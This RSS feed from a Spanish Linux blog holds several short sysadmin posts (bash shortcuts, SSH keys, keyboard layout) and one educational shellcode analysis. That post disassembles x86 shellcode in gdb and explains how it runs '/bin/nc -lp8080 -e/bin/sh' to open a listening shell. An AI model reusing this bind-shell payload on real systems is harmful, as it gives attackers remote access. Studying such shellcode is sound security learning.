<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>deibit (linux)</title><link>http://deibit.com/</link><description></description><atom:link href="http://deibit.com/categories/linux.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><lastBuildDate>Thu, 21 Jul 2016 20:59:47 GMT</lastBuildDate><generator>https://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Configurar teclado en español en Linux desde el terminal</title><link>http://deibit.com/posts/2011/07/01/configurar-teclado-en-espanol-en-linux-desde-el-terminal/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Para cargar la configuración de teclado en Español en Linux desde el terminal:&lt;/p&gt;
&lt;p&gt;loadkeys es&lt;/p&gt;
</description><category>bash</category><category>español</category><category>keyboard</category><category>keys</category><category>linux</category><category>mapping</category><guid>http://deibit.com/posts/2011/07/01/configurar-teclado-en-espanol-en-linux-desde-el-terminal/</guid><pubDate>Fri, 01 Jul 2011 16:25:31 GMT</pubDate></item><item><title>Analizando un shellcode (III)</title><link>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Hasta ahora hemos visto como está estructurado el shellcode y como se produce la llamada al sistema. También hemos comentado como se produce un salto hacia el final (donde se encuentra “/bin/nc -lp8080 -e/bin/sh”) y vuelta hacia delante para obtener un pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;Vamos a ver como se ejecutan las instrucciones del shellcode para elaborar los argumentos que faltan y para pasarlos a la llamada al sistema. Recordemos que esta llamada al sistema precisa de 3 argumentos:&lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp"]&lt;br&gt;
int execve(const char *filename, char *const argv[], char *const envp[]);&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Filename&lt;/strong&gt;: un nombre de archivo (un puntero a una cadena)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;argv&lt;/strong&gt;:        un puntero a un array de punteros a char (cadenas) que serán los argumentos a pasar al programa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;envp&lt;/strong&gt;:       un puntero a un array de punteros a char (más cadenas) donde podemos pasar variables de entorno para el proceso a crear.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Y ahora dos preguntas:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;¿No deben los arrays de punteros a cadenas terminar con un ’0′ cada cadena?&lt;br&gt;
¿No deben no contener el carácter ’0′ los shellcodes?&lt;/p&gt;
&lt;p&gt;Esto es lo que hace el resto del código que aun no hemos comentado aun, modificar la cadena que ya está en memoria para ir creando los caracteres que faltan e ir posicionando las partes precisas para que luego las podamos meter en los registros que van a servir para la llamada la sistema.&lt;/p&gt;
&lt;p&gt;Y aquí también es donde entra la magia o arte del shellcoding: cuantas menos instrucciones más pequeño y cuanto más pequeño mejor.&lt;/p&gt;
&lt;p&gt;Bien, tenemos el código:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/30i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das              &amp;lt;——————- COMIENZO DE CADENA&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;y tenemos la cadena:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|&lt;br&gt;
00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Esto último es la salida del comando hexdump, donde el carácter ‘/’ que en hexadecimal es ’2f’. La dirección de comienzo de la cadena será: 0x804a071. Esta dirección, lo volvemos a repetir, la conoce el shellcode al saltar hacia “call 0x804a042″, se produce la llamada y se carga en la pila la dirección de retorno que es exactamente donde empieza la cadena. Al ir a la dirección de la llamada lo primero que se hace es pop a ESI donde se carga esta dirección. Es en este registro donde tenemos el pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;La siguiente instrucción es un “xor %eax,%eax” que no es otra cosa que poner a ’0′ el registro EAX. Ya tenemos el cero que andábamos buscando.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguientes instrucciones:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
[/sourcecode]&lt;br&gt;
”&lt;br&gt;
AL es el último byte (el de menor peso) del registro EAX, que tiene el valor de ’00′. Este valor va a ser “copiado” a ESI + 0x7, ESI + 0xF y ESI + 19.&lt;/p&gt;
&lt;p&gt;Como ESI vale 0x804a071 podemos hacer nuestras cuentas:&lt;/p&gt;
&lt;p&gt;0x804a071 + 0x7  =  0x804a079&lt;br&gt;
0x804a071 + 0xF  =  0x804a080&lt;br&gt;
0x804a071 + 0x19 = 0x804a08A&lt;/p&gt;
&lt;p&gt;Direcciones que se corresponden con las letras de la cadena: primer ‘#’, segundo ‘#’ y tercer ‘#’. Prácticamente un reemplazo de los caracteres ‘#’ por ’0′.&lt;/p&gt;
&lt;p&gt;La cadena queda partida en 3 subcadenas: &lt;/p&gt;
&lt;p&gt;/bin/nc   -lp8080   -e/bin/sh&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguiente grupo:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Instrucción por instrucción:&lt;/p&gt;
&lt;p&gt;1.- Mueve el valor de ESI (dirección de comienzo de la cadena) al final de la cadena ESI+0x1A. Ojo, aquí tenemos una dirección que apunta a la primera subcadena: “/bin/nc”&lt;br&gt;
2.- Carga en EBX el valor de la dirección efectiva (Load Effective Address) de ESI+0x8. Que es donde comienza la siguiente subcadena: “-lp8080″ ¿No es un buen lugar para comenzar un array de cadenas?&lt;br&gt;
3.- Mueve a ESI+0x22 el valor de EBX. Ya tenemos al final de la cadena la dirección de la primera subcadena seguido de la dirección de la segunda.&lt;br&gt;
4.- Carga en EBX el valor de la dirección efectiva de ESI + 0x10. Esto nos deja en EBX la dirección 0x804a081 que es la subcadena “-e/bin/sh”&lt;br&gt;
5.- Mueve el valor que hay en EBX (la dirección de la ultima subcadena) a ESI+0x22. Ya tenemos al final de la cadena las 3 direcciones de las subcadenas.&lt;br&gt;
6.- Mueve EAX que vale 0x00000000 a ESI+0x26&lt;/p&gt;
&lt;p&gt;Al final terminamos con este layout al final de la cadena original del shellcode:&lt;/p&gt;
&lt;p&gt;FINAL DE LA CADENA | DIRECCIÓN PRIMERA SUBCADENA | DIRECCIÓN SEGUNDA SUBCADENA | DIRECCIÓN ULTIMA SUBCADENA | 0x00000000&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cargamos parámetros para la llamada al sistema&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;1.- En AL cargamos el valor 0xb que es 11 y que es el código de la llamada al sistema de “&lt;a href="http://linux.die.net/man/2/execve"&gt;execv&lt;/a&gt;”&lt;br&gt;
2.- Cargamos ESI en EBX para el primer parámetro que es el archivo a ejecutar. En este caso “/bin/nc” la herramienta NetCat.&lt;br&gt;
3.- Cargamos en ECX para el segundo parámetro el puntero a la siguiente subcadena que hará de puntero a array de cadenas y que contendrá los parámetros a pasar a NetCat que nos son otros que “-lp8080″ y “-e/bin/sh”.&lt;br&gt;
4.- Cargamos en EDX, el tercer parámetro para la llamada al sistema, el valor apuntado por ESI+0x26 que es como recordamos 0x00000000 o lo que es lo mismo, le estamos pasando un puntero nulo para decirle que no vamos a usar ese parámetro.&lt;br&gt;
5.- INT $0x80, sobran explicaciones: Si todo a ido bien esta interrupción le dice al núcleo que ejecute nuestra llamada y por lo tanto se cree un proceso que abrirá una shell a la escucha en el puerto 8080 de la máquina remota.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Tengo una bonita demostración para este shellcode pero no me queda espacio en este post. Lo dejo para otro.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Entradas anteriores&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://prisonernumbersix.com/2011/01/19/analizando-un-shellcode-i/"&gt;Analizando un shellcode I&lt;/a&gt;&lt;br&gt;
&lt;a href="http://prisonernumbersix.com/2011/02/12/analizando-un-shellcode-ii/"&gt;Analizando un shellcode II&lt;/a&gt;&lt;/p&gt;
</description><category>exploiting</category><category>linux</category><category>seguridad</category><category>shellcoding</category><guid>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</guid><pubDate>Wed, 13 Apr 2011 19:02:44 GMT</pubDate></item><item><title>Algunos atajos interesantes en Bash</title><link>http://deibit.com/posts/2011/01/16/algunos-atajos-interesantes-en-bash/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Sobre todo en Mac, se echa de menos algunos atajos de teclado para ir al final o al principio (‘end’ y ‘home’) de una linea en el Terminal.&lt;/p&gt;
&lt;p&gt;Estos atajos de teclado funcionan en todos los Bash, así que pueden usarse en Mac y suplir esa carencia.&lt;/p&gt;
&lt;p&gt;Ir al principio y final de una frase respectivamente: Ctrl + A y Ctrl + E&lt;/p&gt;
&lt;p&gt;Avanzar una palabra antes y después del cursor: Alt + B y Alt + F&lt;/p&gt;
&lt;p&gt;Borrar lo que haya delante o después del cursor: Ctrl + U y Ctrl + K&lt;/p&gt;
&lt;p&gt;Borrar una palabra delante o después del cursor: Ctrl + W y Alt + D&lt;/p&gt;
&lt;p&gt;Cambiar a MAY, min, Cap una palabra: Alt + U, Alt + M, Alt + C respectivamente.&lt;/p&gt;
&lt;p&gt;Transponer dos caracteres o dos palabras: Ctrl + T y Alt + T&lt;/p&gt;
&lt;p&gt;Histórico atrás y hacia delante: Ctrl + R y Ctrl + S&lt;/p&gt;
&lt;p&gt;Estamos editando una linea muy larga y decidimos hacerlo en nuestro $EDITOR: Ctrl + X Ctrl + E&lt;/p&gt;
</description><category>bash</category><category>consola</category><category>linux</category><category>MacOSX</category><category>Shortcuts</category><category>terminal</category><guid>http://deibit.com/posts/2011/01/16/algunos-atajos-interesantes-en-bash/</guid><pubDate>Sun, 16 Jan 2011 13:05:19 GMT</pubDate></item><item><title>Autenticación por llave en SSH</title><link>http://deibit.com/posts/2011/01/15/autenticacion-por-llave-en-ssh/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Cuando tienes varias máquinas se hace tedioso loguearte cada vez que tienes que entrar en alguna.&lt;/p&gt;
&lt;p&gt;Para ello disponemos de la opción de autenticarnos a través de una llave.&lt;/p&gt;
&lt;p&gt;Primero generamos una llave en nuestra máquina local:&lt;/p&gt;
&lt;p&gt;home$ ssh-keygen -t rsa -b 4096&lt;/p&gt;
&lt;p&gt;Donde -t es el tipo de cifrado (rsa, dsa…) y -b es la lontigud en bits de la clave.&lt;/p&gt;
&lt;p&gt;Nos preguntará donde queremos guardar la llave. La opción por defecto es en ‘./ssh/id_rsa’&lt;/p&gt;
&lt;p&gt;Ahora debemos copiar la llave pública a la máquina remota:&lt;/p&gt;
&lt;p&gt;home$ scp ~/.ssh/id_rsa.pub usuario@remota:&lt;/p&gt;
&lt;p&gt;Esto deja la llave pública en nuestro ‘home’ remoto.&lt;/p&gt;
&lt;p&gt;Ahora debemos concatenar esa llave pública al archivo del home remoto ‘.ssh/authorized_keys’&lt;/p&gt;
&lt;p&gt;Entramos en la máquina remota y concatenamos la llave que hemos copiado a través de ‘scp’ en el home.&lt;/p&gt;
&lt;p&gt;remota$ cat id_rsa.pub &amp;gt;&amp;gt; .ssh/authorized_keys&lt;/p&gt;
&lt;p&gt;y borramos la llave pública:&lt;/p&gt;
&lt;p&gt;remota$ rm id_rsa.pub&lt;/p&gt;
&lt;p&gt;Si usamos GNOME el programa GNOME Keyring nos preguntará la frase de paso y nos dará opción a que cada vez que nos logueemos&lt;br&gt;
lo hará por nosotros facilitando la entrada en cada máquina.&lt;/p&gt;
</description><category>bash</category><category>linux</category><category>ssh</category><guid>http://deibit.com/posts/2011/01/15/autenticacion-por-llave-en-ssh/</guid><pubDate>Sat, 15 Jan 2011 11:54:31 GMT</pubDate></item><item><title>Copiar de la linea de comandos al portapapeles</title><link>http://deibit.com/posts/2011/01/12/copiar-de-la-linea-de-comandos-al-portapapeles/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Lo dejo aquí como nota, siempre se me olvida y termino buscándolo. La idea: copiar la salida de un comando al portapapeles.&lt;/p&gt;
&lt;p&gt;En GNU tenemos ‘xclip’ y ‘xsel’ y para Mac OSX el instalado por defecto: ‘pbcopy’.&lt;/p&gt;
</description><category>bash</category><category>linux</category><category>MacOSX</category><guid>http://deibit.com/posts/2011/01/12/copiar-de-la-linea-de-comandos-al-portapapeles/</guid><pubDate>Wed, 12 Jan 2011 21:47:14 GMT</pubDate></item><item><title>La resolución mínima jamas "vista"</title><link>http://deibit.com/posts/2010/12/15/la-resolucion-minima-jamas-vista/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Durante una instalación de las Additional Tools para una Ubuntu 10.10 en Virtual Box falló (igual siempre sale así) el driver de video. Es lógico puesto que precisamente se instala un nuevo driver en el huésped para mejorar la experiencia de usuario. El caso es que llamó la atención la forma de visualizarse la salida de video:&lt;br&gt;
&lt;a href="http://daganu.files.wordpress.com/2010/12/petada.jpg"&gt;&lt;img src="http://daganu.files.wordpress.com/2010/12/petada.jpg?w=300" alt="" title="petada" width="300" height="241" class="aligncenter size-medium wp-image-98"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Lo que se ve a la izquierda es el símbolo o logo de Ubuntu, a la derecha de él, el menu de Aplicaciones (en inglés).&lt;br&gt;
&lt;a href="http://daganu.files.wordpress.com/2010/12/petada2.jpg"&gt;&lt;img src="http://daganu.files.wordpress.com/2010/12/petada2.jpg?w=300" alt="" title="petada2" width="300" height="241" class="aligncenter size-medium wp-image-99"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Esa sombra que se ve por ahí en medio es el cursor.&lt;/p&gt;
&lt;p&gt;Resulta bella la mezcla de colores y caracteres ASCII, da la sensación de estamos tirando de consola para componer una proyección gráfica exagerada de la interfaz de usuario.&lt;/p&gt;
</description><category>driver</category><category>freak</category><category>linux</category><category>ubuntu</category><category>virtualización</category><category>xorg</category><guid>http://deibit.com/posts/2010/12/15/la-resolucion-minima-jamas-vista/</guid><pubDate>Wed, 15 Dec 2010 16:02:29 GMT</pubDate></item></channel></rss>